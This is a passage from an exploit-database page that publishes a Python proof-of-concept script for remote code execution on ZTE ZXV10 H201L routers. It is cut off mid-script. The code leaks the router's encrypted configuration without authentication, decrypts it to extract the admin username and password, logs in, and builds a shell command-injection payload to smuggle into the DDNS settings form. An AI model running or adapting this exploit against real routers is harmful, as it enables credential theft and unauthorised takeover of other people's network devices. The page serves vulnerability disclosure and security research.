---
title: ZTE ZXV10 H201L RCE via authentication bypass
url: https://cxsecurity.com/issue/WLB-2025050054
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-30
fetch_date: 2025-10-06T22:24:11.301512
---

# ZTE ZXV10 H201L RCE via authentication bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ZTE ZXV10 H201L RCE via authentication bypass** **2025.05.29**  Credit:  **[l34n](https://cxsecurity.com/author/l34n/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: ZTE ZXV10 H201L - RCE via authentication bypass
# Exploit Author: l34n (tasos meletlidis)
# https://i0.rs/blog/finding-0click-rce-on-two-zte-routers/
import http.client, requests, os, argparse, struct, zlib
from io import BytesIO
from os import stat
from Crypto.Cipher import AES
def login(session, host, port, username, password):
login\_token = session.get(f"http://{host}:{port}/").text.split("getObj(\"Frm\_Logintoken\").value = \"")[1].split("\"")[0]
headers = {
"Content-Type": "application/x-www-form-urlencoded"
}
data = {
"Username": username,
"Password": password,
"frashnum": "",
"Frm\_Logintoken": login\_token
}
session.post(f"http://{host}:{port}/", headers=headers, data=data)
def logout(session, host, port):
headers = {
"Content-Type": "application/x-www-form-urlencoded"
}
data = {
"logout": "1",
}
session.post(f"http://{host}:{port}/", headers=headers, data=data)
def leak\_config(host, port):
conn = http.client.HTTPConnection(host, port)
boundary = "----WebKitFormBoundarysQuwz2s3PjXAakFJ"
body = (
f"--{boundary}\r\n"
'Content-Disposition: form-data; name="config"\r\n'
"\r\n"
"\r\n"
f"--{boundary}--\r\n"
)
headers = {
"Content-Type": f"multipart/form-data; boundary={boundary}",
"Content-Length": str(len(body)),
"Connection": "close",
}
conn.request("POST", "/getpage.gch?pid=101", body, headers)
response = conn.getresponse()
response\_data = response.read()
with open("config.bin", "wb") as file:
file.write(response\_data)
conn.close()
def \_read\_exactly(fd, size, desc="data"):
chunk = fd.read(size)
if len(chunk) != size:
return None
return chunk
def \_read\_struct(fd, fmt, desc="struct"):
size = struct.calcsize(fmt)
data = \_read\_exactly(fd, size, desc)
if data is None:
return None
return struct.unpack(fmt, data)
def read\_aes\_data(fd\_in, key):
encrypted\_data = b""
while True:
aes\_hdr = \_read\_struct(fd\_in, ">3I", desc="AES chunk header")
if aes\_hdr is None:
return None
\_, chunk\_len, marker = aes\_hdr
chunk = \_read\_exactly(fd\_in, chunk\_len, desc="AES chunk data")
if chunk is None:
return None
encrypted\_data += chunk
if marker == 0:
break
cipher = AES.new(key.ljust(16, b"\0")[:16], AES.MODE\_ECB)
fd\_out = BytesIO()
fd\_out.write(cipher.decrypt(encrypted\_data))
fd\_out.seek(0)
return fd\_out
def read\_compressed\_data(fd\_in, enc\_header):
hdr\_crc = zlib.crc32(struct.pack(">6I", \*enc\_header[:6]))
if enc\_header[6] != hdr\_crc:
return None
total\_crc = 0
fd\_out = BytesIO()
while True:
comp\_hdr = \_read\_struct(fd\_in, ">3I", desc="compression chunk header")
if comp\_hdr is None:
return None
uncompr\_len, compr\_len, marker = comp\_hdr
chunk = \_read\_exactly(fd\_in, compr\_len, desc="compression chunk data")
if chunk is None:
return None
total\_crc = zlib.crc32(chunk, total\_crc)
uncompressed = zlib.decompress(chunk)
if len(uncompressed) != uncompr\_len:
return None
fd\_out.write(uncompressed)
if marker == 0:
break
if enc\_header[5] != total\_crc:
return None
fd\_out.seek(0)
return fd\_out
def read\_config(fd\_in, fd\_out, key):
ver\_header\_1 = \_read\_struct(fd\_in, ">5I", desc="1st version header")
if ver\_header\_1 is None:
return
ver\_header\_2\_offset = 0x14 + ver\_header\_1[4]
fd\_in.seek(ver\_header\_2\_offset)
ver\_header\_2 = \_read\_struct(fd\_in, ">11I", desc="2nd version header")
if ver\_header\_2 is None:
return
ver\_header\_3\_offset = ver\_header\_2[10]
fd\_in.seek(ver\_header\_3\_offset)
ver\_header\_3 = \_read\_struct(fd\_in, ">2H5I", desc="3rd version header")
if ver\_header\_3 is None:
return
signed\_cfg\_size = ver\_header\_3[3]
file\_size = stat(fd\_in.name).st\_size
fd\_in.seek(0x80)
sign\_header = \_read\_struct(fd\_in, ">3I", desc="signature header")
if sign\_header is None:
return
if sign\_header[0] != 0x04030201:
return
sign\_length = sign\_header[2]
signature = \_read\_exactly(fd\_in, sign\_length, desc="signature")
if signature is None:
return
enc\_header\_raw = \_read\_exactly(fd\_in, 0x3C, desc="encryption header")
if enc\_header\_raw is None:
return
encryption\_header = struct.unpack(">15I", enc\_header\_raw)
if encryption\_header[0] != 0x01020304:
return
enc\_type = encryption\_header[1]
if enc\_type in (1, 2):
if not key:
return
fd\_in = read\_aes\_data(fd\_in, key)
if fd\_in is None:
return
if enc\_type == 2:
enc\_header\_raw = \_read\_exactly(fd\_in, 0x3C, desc="second encryption header")
if enc\_header\_raw is None:
return
encryption\_header = struct.unpack(">15I", enc\_header\_raw)
if encryption\_header[0] != 0x01020304:
return
enc\_type = 0
if enc\_type == 0:
fd\_in = read\_compressed\_data(fd\_in, encryption\_header)
if fd\_in is None:
return
fd\_out.write(fd\_in.read())
def decrypt\_config(config\_key):
encrypted = open("config.bin", "rb")
decrypted = open("decrypted.xml", "wb")
read\_config(encrypted, decrypted, config\_key)
with open("decrypted.xml", "r") as file:
contents = file.read()
username = contents.split("IGD.AU2")[1].split("User")[1].split("val=\"")[1].split("\"")[0]
password = contents.split("IGD.AU2")[1].split("Pass")[1].split("val=\"")[1].split("\"")[0]
encrypted.close()
os.system("rm config.bin")
decrypted.close()
os.system("rm decrypted.xml")
return username, password
def command\_injection(cmd):
injection = f"user;{cmd};echo "
injection = injection.replace(" ", "${IFS}")
return injection
def set\_ddns(session, host, port, payload):
headers = {
"Content-Type": "application/x-www-form-urlencoded"
}
data = {
"IF\_ACTION": "apply",
"IF\_ERRORSTR": "SUCC",
"IF\_ERRORPARAM": "SUCC",
"IF\_ERRORTYPE": -1,
"IF\_INDEX": None,
"IFservice\_INDEX": 0,
"IF\_NAME": None,
"Name": "dyndns",
"Server": "http://www.dyndns.com/",
"ServerPort": None,
"Request": None,
"UpdateInterval": None,
"RetryInterval": None,
"MaxRetries": None,
"Name0": "dyndns",
"Server0": "http://www.dyndns.com/",
"ServerPort0": 80,
"Request0": "",
"UpdateInterval0": 86400,
"RetryInterval0": 60,
"MaxRetries0": 3,
"Name1": "No...